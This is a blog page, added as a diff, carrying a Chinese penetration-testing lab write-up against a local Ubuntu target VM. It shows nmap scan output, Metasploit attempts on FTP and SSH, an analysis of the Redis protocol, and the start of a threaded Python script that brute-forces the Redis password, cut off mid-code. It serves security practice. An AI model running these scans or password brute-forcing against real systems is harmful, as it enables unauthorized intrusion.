@@ -1,0 +1,1476 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag (contains Google-Analytics、Baidu-Tongji)-->
+<head>
+  <!-- Google Analytics -->
+  
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async="async" src="https://www.googletagmanager.com/gtag/js?id=UA-xxxxxx-xx"></script>
+    <script type="text/javascript">
+      window.dataLayer = window.dataLayer || [];
+
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag('js', new Date());
+
+      gtag('config', 'UA-xxxxxx-xx');
+    </script>
+  
+
+  <!-- Baidu Tongji -->
+  
+    <script type="text/javascript">
+      // Originial
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  <!-- Baidu Push -->
+  
+    <script>
+      (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+      })();
+    </script>
+  
+
+  <meta charset="utf-8"/>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+
+  <meta name="google-site-verification" content="lxDfCplOZbIzjhG34NuQBgu2gdyRlAtMB4utP5AgEBc"/>
+  <meta name="baidu-site-verification" content="PpzM9WxOJU"/>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <meta name="description" content="Morouu的大狗窝 ●&#39;◡&#39;●"/>
+  <meta name="keyword" content="Morouu,morouu"/>
+  <link rel="shortcut icon" href="/img/avatar/mdx.png"/>
+
+  <!-- Place this tag in your head or just before your close body tag. -->
+  <script async="async" defer="defer" src="https://buttons.github.io/buttons.js"></script>
+
+  
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css"/>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/beantech.min.css"/>
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css"/>
+    <link rel="stylesheet" href="/css/widget.css"/>
+    <link rel="stylesheet" href="/css/rocket.css"/>
+    <link rel="stylesheet" href="/css/signature.css"/>
+    <link rel="stylesheet" href="/css/catalog.css"/>
+    <link rel="stylesheet" href="/css/livemylife.css"/>
+
+    
+      <!-- wave start -->
+      <link rel="stylesheet" href="/css/wave.css"/>
+      <!-- wave end -->
+    
+
+    
+      <!-- top start (article top hot config) -->
+      <link rel="stylesheet" href="/css/top.css"/>
+      <!-- top end -->
+    
+
+    
+      <!-- ThemeColor start -->
+      <link rel="stylesheet" href="/css/scroll.css"/>
+      <!-- ThemeColor end -->
+    
+
+    
+      <!-- viewer start (Picture preview) -->
+      <link rel="stylesheet" href="/css/viewer.min.css"/>
+      <!-- viewer end -->
+    
+
+    
+      <!-- Search start -->
+      <link rel="stylesheet" href="/css/search.css"/>
+      <!-- Search end -->
+    
+
+    
+      <!-- ThemeColor start -->
+      <link rel="stylesheet" href="/css/themecolor.css"/>
+      <!-- ThemeColor end -->
+    
+
+    
+      <!-- gitment start -->
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/theme-next/theme-next-gitment@1/default.css"/>
+      <!-- gitment end -->
+    
+
+    
+  
+
+  <!-- Custom Fonts -->
+  <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+  <!-- Hux change font-awesome CDN to qiniu -->
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" type="text/css">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+  <!-- Hux Delete, sad but pending in China <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'> <link
+  href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/ css'> -->
+
+  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->
+
+  <!-- ga & ba script hoook -->
+  <link rel="canonical" href="https://morblog.cc/4258246850/">
+  <title>
+    
+      练习 - Ubuntu19渗透 - Morouu的大狗窝 ●&#39;◡&#39;●
+    
+  </title>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<!-- hack iOS CSS :active style -->
+
+	<body ontouchstart="" class="body--light body--light">
+
+
+		<!-- ThemeColor -->
+		
+		<!-- ThemeColor -->
+<style type="text/css">
+  .body--light {
+    --light-mode: none;
+    --dark-mode: block;
+  }
+  .body--dark {
+    --light-mode: block;
+    --dark-mode: none;
+  }
+  i.mdui-icon.material-icons.light-mode {
+    display: var(--light-mode);
+  }
+  i.mdui-icon.material-icons.dark-mode {
+    display: var(--dark-mode);
+  }
+</style>
+<div class="toggle" onclick="document.body.classList.toggle('body--dark')">
+  <i class="mdui-icon material-icons light-mode"></i>
+  <i class="mdui-icon material-icons dark-mode"></i>
+</div>
+<script>
+  //getCookieValue
+  function getCookieValue(a) {
+    var b = document.cookie.match('(^|[^;]+)\\s*' + a + '\\s*=\\s*([^;]+)');
+    return b
+      ? b.pop()
+      : '';
+  }
+  let themeMode = 'light';
+  if (getCookieValue('sb-color-mode') && (getCookieValue('sb-color-mode') !== themeMode)) {
+    let dbody = document.body.classList;
+    themeMode === 'dark' ? dbody.remove('body--dark') : dbody.add('body--dark');
+  }
+
+  //setCookieValue
+  var toggleBtn = document.querySelector(".toggle");
+  toggleBtn.addEventListener("click", function () {
+    var e = document.body.classList.contains("body--dark");
+    var cookieString = e
+      ? "dark"
+      : "light";
+    var exp = new Date();
+    exp.setTime(exp.getTime() + 3 * 24 * 60 * 60 * 1000); //3天过期
+    document.cookie = "sb-color-mode=" + cookieString + ";expires=" + exp.toGMTString() + ";path=/";
+  });
+</script>
+
+		
+
+		<!-- Gitter -->
+		
+		<!-- Gitter -->
+<!-- Docs:https://gitter.im/?utm_source=left-menu-logo -->
+<script>
+  ((window.gitter = {}).chat = {}).options = {
+    room: 'dmantick/morcruiser'
+  };
+</script>
+<script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async defer></script>
+
+		
+
+		<!-- Navigation (contains search)-->
+		<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+  <div class="container-fluid">
+    <!-- Brand and toggle get grouped for better mobile display -->
+    <div class="navbar-header page-scroll">
+      <button type="button" class="navbar-toggle">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="/">Morouu的大狗窝 ●&#39;◡&#39;●</a>
+    </div>
+
+    <!-- Collect the nav links, forms, and other content for toggling -->
+    <!-- Known Issue, found by Hux: <nav>'s height woule be hold on by its content. so, when navbar scale out, the <nav> will cover tags. also mask any touch event of tags, unfortunately. -->
+    <div id="huxblog_navbar">
+      <div class="navbar-collapse">
+        <ul class="nav navbar-nav navbar-right">
+          <li>
+            <a href="/">首页</a>
+          </li>
+
+          
+          
+          
+          
+          <li>
+            <a href="/about/">
+              
+              关于
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/archive/">
+              
+              归档
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/tags/">
+              
+              标签
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/categories/">
+              
+              分类
+              
+              
+            </a>
+          </li>
+          
+          
+
+          
+          <li>
+            <a class="popup-trigger">
+              <span class="search-icon"></span>搜索</a>
+          </li>
+          
+
+          <!-- LangSelect -->
+          
+          
+          
+          
+          
+        </ul>
+      </div>
+    </div>
+    <!-- /.navbar-collapse -->
+  </div>
+  <!-- /.container -->
+</nav>
+<!-- progress -->
+<div id="progress">
+  <div class="line" style="width: 0%;"></div>
+</div>
+
+<script>
+  // Drop Bootstarp low-performance Navbar Use customize navbar with high-quality material design animation in high-perf jank-free CSS3 implementation
+  var $body = document.body;
+  var $toggle = document.querySelector('.navbar-toggle');
+  var $navbar = document.querySelector('#huxblog_navbar');
+  var $collapse = document.querySelector('.navbar-collapse');
+
+  $toggle.addEventListener('click', handleMagic)
+
+  function handleMagic(e) {
+    if ($navbar.className.indexOf('in') > 0) {
+      // CLOSE
+      $navbar.className = " ";
+      // wait until animation end.
+      setTimeout(function() {
+        // prevent frequently toggle
+        if ($navbar.className.indexOf('in') < 0) {
+          $collapse.style.height = "0px"
+        }
+      }, 400)
+    } else {
+      // OPEN
+      $collapse.style.height = "auto"
+      $navbar.className += " in";
+    }
+  }
+</script>
+
+
+		<!-- Post Header (contains intro-header、signature、wordcount、busuanzi、waveoverlay) -->
+		<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+
+  <style type="text/css">
+    .body--light {
+      /* intro-header */
+      --intro-header-background-image-url-home: url('/img/header_img/bgtop.jpg');
+      --intro-header-background-image-url-post: url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210321214141.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
+      --intro-header-background-image-url-page: url('/https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210321214141.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
+    }
+    .body--dark {
+      --intro-header-background-image-url-home: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/bgtop.jpg');
+      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210321214141.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
+      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210321214141.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
+    }
+
+    header.intro-header {
+       /*post*/
+        background-image: var(--intro-header-background-image-url-post);
+        /* background-image: url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210321214141.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080'); */
+      
+    }
+
+    
+      #signature {/*signature*/
+        background-image: url('/img/signature/morouu2.png');
+      }
+    
+  </style>
+
+
+
+
+
+<header class="intro-header">
+  <!-- Signature -->
+  <div id="signature">
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+          
+          <div class="post-heading">
+            <div class="tags">
+              
+              <a class="tag" href="/tags/#安全" title="安全">安全</a>
+              
+              <a class="tag" href="/tags/#WEB" title="WEB">WEB</a>
+              
+              <a class="tag" href="/tags/#渗透" title="渗透">渗透</a>
+              
+            </div>
+            <h1>练习 - Ubuntu19渗透</h1>
+            <h2 class="subheading"></h2>
+            <span class="meta">
+              Posted by morouu on
+              2021-12-27
+            </span>
+
+
+            
+            <!-- WordCount start -->
+            <div class="blank_box"></div>
+            <span class="meta">
+              Estimated Reading Time <span class="post-count" >85</span> Minutes
+            </span>
+            <div class="blank_box"></div>
+            <span class="meta">
+              Words <span class="post-count">15.1k</span> In Total
+            </span>
+            <div class="blank_box"></div>
+            <!-- WordCount end -->
+            
+            
+            <!-- 不蒜子统计 start -->
+            <span class="meta" id="busuanzi_container_page_pv">
+              Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
+            </span>
+            <!-- 不蒜子统计 end -->
+            
+
+
+          </div>
+          
+        </div>
+      </div>
+    </div>
+  </div>
+
+  
+  <!-- waveoverlay start -->
+  <div class="preview-overlay">
+    <svg class="preview-waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+      <defs>
+        <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path>
+      </defs>
+      <g class="preview-parallax">
+        <use xlink:href="#gentle-wave" x="48" y="0" fill=var(--gentle-wave1)></use>
+        <use xlink:href="#gentle-wave" x="48" y="3" fill=var(--gentle-wave2)></use>
+        <use xlink:href="#gentle-wave" x="48" y="5" fill=var(--gentle-wave3)></use>
+        <use xlink:href="#gentle-wave" x="48" y="7" fill=var(--gentle-wave)></use>
+      </g>
+    </svg>
+  </div>
+  <!-- waveoverlay end -->
+  
+
+</header>
+
+
+
+		<!-- Main Content (Post contains
+	Pager、
+	tip、
+	socialshare、
+	gitalk、gitment、disqus-comment、
+	Catalog、
+	Sidebar、
+	Featured-Tags、
+	Friends Blog、
+	anchorjs、
+	) -->
+		<!-- Modify by Yu-Hsuan Yen -->
+<!-- Post Content -->
+<article>
+  <div class="container" style="margin-left: 10%;">
+    <div class="row">
+      <!-- Post Container -->
+      <div class="col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
+
+        <h1>练习 - Ubuntu19渗透</h1>
+<hr>
+<h2 id="目标配置">- 目标配置 -</h2>
+<p>攻击机：</p>
+<ul>
+<li>Kali(msf6)：192.168.111.133</li>
+</ul>
+<p>靶机：</p>
+<ul>
+<li>Ubuntu19：192.168.111.142</li>
+</ul>
+<hr>
+<h2 id="具体步骤">- 具体步骤 -</h2>
+<h3 id="信息搜集-getshell">- 信息搜集 &amp; getshell -</h3>
+<p>话不说，直接上 <strong>端口扫描</strong> 吧：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O -A -sV -p- 192.168.111.142</span><br></pre></td></tr></table></figure>
+<p>得到结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/ctf/python]</span><br><span class="line">└─<span class="comment"># nmap -O -A -sV -p- 192.168.111.142 </span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-13 08:55 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.111.142</span><br><span class="line">Host is up (0.00056s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 ca:5d:8f:1a:58:0c:cb:eb:39:b7:7a:aa:e5:d0:ed:5d (RSA)</span><br><span class="line">|   256 d3:dd:e1:1e:ad:1b:a5:c3:55:4b:70:29:3b:4e:ea:be (ECDSA)</span><br><span class="line">|_  256 14:a7:b5:af:3a:15:f3:df:70:e4:ad:4d:cf:c1:65:0d (ED25519)</span><br><span class="line">80/tcp   open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: GXU\xE5\x92\x95\xE5\x99\x9C\xE7\x81\xB5\xE6\xB3\xA2~\xE5\xB9\xB3\xE5\x8F\xB0</span><br><span class="line">6379/tcp open  redis   Redis key-value store</span><br><span class="line">MAC Address: 00:0C:29:83:43:B8 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.56 ms 192.168.111.142</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 23.79 seconds</span><br></pre></td></tr></table></figure>
+<p>可以看到，开放的端口如下：</p>
+<ul>
+<li>21端口：ftp</li>
+<li>22端口：ssh</li>
+<li>80端口：http</li>
+<li>6379端口：redis</li>
+</ul>
+<p>行吧，这个靶机看起还挺稳固的，开的端口不是很多。由于开放的端口比较少，这里依次对所开放的端口进行攻击尝试。</p>
+<h4 id="21端口-ftp">- 21端口 (ftp) -</h4>
+<p>从上边的 <strong>nmap</strong> 扫描结果，轻易的出来这个 <strong>ftp</strong> 应用为 <strong>vsftpd 3.0.3</strong> 的，不妨直接使用 <strong>msf</strong> 进行尝试。</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210313220313.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210313220312817"></p>
+<p>emmm，这个版本似乎是比较久远了，显然是不太行的了。可以试试看吧。</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210313220452.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210313220452121"></p>
+<p>确实不太行，试试看能否从 <strong>匿名用户</strong> 登录以便搜集一些信息啥的。</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210313224628.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210313224628406"></p>
+<p>匿名用户看起来也是不行的了，暴力破解显然是不太可取的。那么 <strong>ftp</strong> 这条路就暂且搁置。</p>
+<h4 id="22端口-ssh">- 22端口 (ssh) -</h4>
+<p>还是先用 <strong>msf</strong> 的侦察模块去试一下吧，</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210313224910.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210313224910484"></p>
+<p>这里得到了有关靶机的 <strong>ssh</strong> 信息，然后尝试 <strong>枚举</strong> 一下 <strong>ssh</strong> 的用户：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210313230221.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210313230221066"></p>
+<p>看起来靶机是开了 <strong>防火墙</strong> 了，不仅对枚举进行 <strong>假正确</strong> 响应，还对暴力枚举进行了次数限制。那就先暂时放弃对 <strong>ssh</strong> 的攻击吧。</p>
+<h4 id="80端口-http">- 80端口 (http) -</h4>
+<p>emmm，实话说这个 <strong>web</strong> 端确实挺有意思的，不过实际上也就是个静态页面而已，没啥突破口可言。</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210313234213.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210313234213299"></p>
+<p>虽然这里得知这个服务器是 <strong>nginx1.14.0</strong> ，但是一个静态网页确实没啥办法啦，直接放弃吧。</p>
+<h4 id="6379端口-getshell-redis">- 6379端口 &amp; getshell (redis) -</h4>
+<p>说到 <strong>redis</strong> ，这里可以尝试访问：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.111.142</span><br></pre></td></tr></table></figure>
+<p>结果是可以进去的，但并不能直接执行指令，还需要进一步认证：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314185923.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314185923784"></p>
+<p>也就是说这个 <strong>redis</strong> 并不存在 <strong>未授权认证</strong> 的漏洞。不过咱么可以写一个暴力破解 <strong>redis</strong> 认证密码的脚本，尝试进行攻击吧。而对于 <strong>redis</strong> 的暴力破解攻击，无非就是 <strong>执行认证命令</strong> -&gt; <strong>检查是否认证成功</strong> 整个步骤，这里可以在本地简单地分析一下 <strong>redis</strong> 的命令格式吧。</p>
+<p>首先在本地将 <strong>redis</strong> 安装了，然后编辑 <code>/etc/redis/redis.conf</code> 文件，设一个简单的密码：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314190738.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314190738615"></p>
+<p>然后使用<code>redis-server redis.conf</code> 将配置加载了，再使用 <code>service redis-server restart</code> 将 <strong>redis</strong> 重启了，再输入 <code>redis-cli</code> 进入本地的 <strong>redis</strong> ，尝试执行任意命令，如果出现认证错误则说明成功设了密码，也可以再尝试输入密码看看：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314191731.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314191731122"></p>
+<p>OK，此时此刻，使用 <strong>socat</strong> 对 <strong>redis</strong> 的整个交互过程进行查看吧，直接执行 <code>socat -v tcp-l:3331,fork,reuseaddr tcp:127.0.0.1:6379,fork</code> 进行端口转发，然后使用 <code>redis-cli -h 127.0.0.1 -p 3331</code> 连接监听的端口。此时就可以看到和 <strong>redis</strong> 交互时的内容了。</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314191438.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314191438935"></p>
+<p>之后使用刚刚设的密码来一个完整的认证，这时可以观察 <strong>redis</strong> 交互时的格式了。</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314192134.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314192134074"></p>
+<p>具体格式为：</p>
+<ul>
+<li>‘*’ + [参数数量] + ‘\r\n’</li>
+<li>‘$’ + [第 1 个参数长度] + ‘\r\n’</li>
+<li>[第 1 个参数内容] + ‘\r\n’</li>
+<li>‘$’ + [第 2 个参数长度] + ‘\r\n’</li>
+<li>[第二个参数内容] + ‘\r\n’</li>
+<li>……</li>
+</ul>
+<p>比如上边的 <code>auth dqv555</code> 这个命令，整个格式即为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*<span class="number">2</span>\r</span><br><span class="line">$<span class="number">4</span>\r</span><br><span class="line">auth\r</span><br><span class="line">$<span class="number">6</span>\r</span><br><span class="line">dqv555\r</span><br></pre></td></tr></table></figure>
+<p>这应该算是显而易见的了，那么假若要爆破 <strong>redis</strong> 的认证密码，不妨可以发一个形如以下格式的包进行爆破，若 <strong>redis</strong> 回显 <strong>OK</strong> 则说明认证成功。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*<span class="number">2</span>\r</span><br><span class="line">$<span class="number">4</span>\r</span><br><span class="line">auth\r</span><br><span class="line">$[密码长度]\r</span><br><span class="line">[密码]\r</span><br></pre></td></tr></table></figure>
+<p>那么，可以简单的写一个脚本吧。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> socket, AF_INET,SOCK_STREAM</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">passContent = <span class="literal">None</span></span><br><span class="line">CRLF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">pad = <span class="string">&quot;\n&quot;</span></span><br><span class="line">waitDict = &#123;&#125;</span><br><span class="line">finish = <span class="literal">False</span></span><br><span class="line">result = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_List</span>(<span class="params"><span class="built_in">list</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, seq=(<span class="params"></span>)</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(_<span class="type">List</span>, self).__init__(seq)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">readline</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> self.pop(<span class="number">0</span>).encode()</span><br><span class="line">        <span class="keyword">except</span> IndexError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.clear()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_Run</span>(<span class="params">Thread</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,host:<span class="built_in">str</span></span>):</span></span><br><span class="line">        <span class="keyword">global</span> waitDict</span><br><span class="line">        <span class="built_in">super</span>(_Run, self).__init__()</span><br><span class="line">        self.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        self.host = <span class="built_in">tuple</span>(<span class="built_in">int</span>(each) <span class="keyword">if</span> each.isalnum() <span class="keyword">else</span> each <span class="keyword">for</span> each <span class="keyword">in</span> host.split(<span class="string">&quot;:&quot;</span>))</span><br><span class="line">        self.thisName = self.getName()</span><br><span class="line">        waitDict.update(&#123;self.thisName:<span class="literal">False</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span 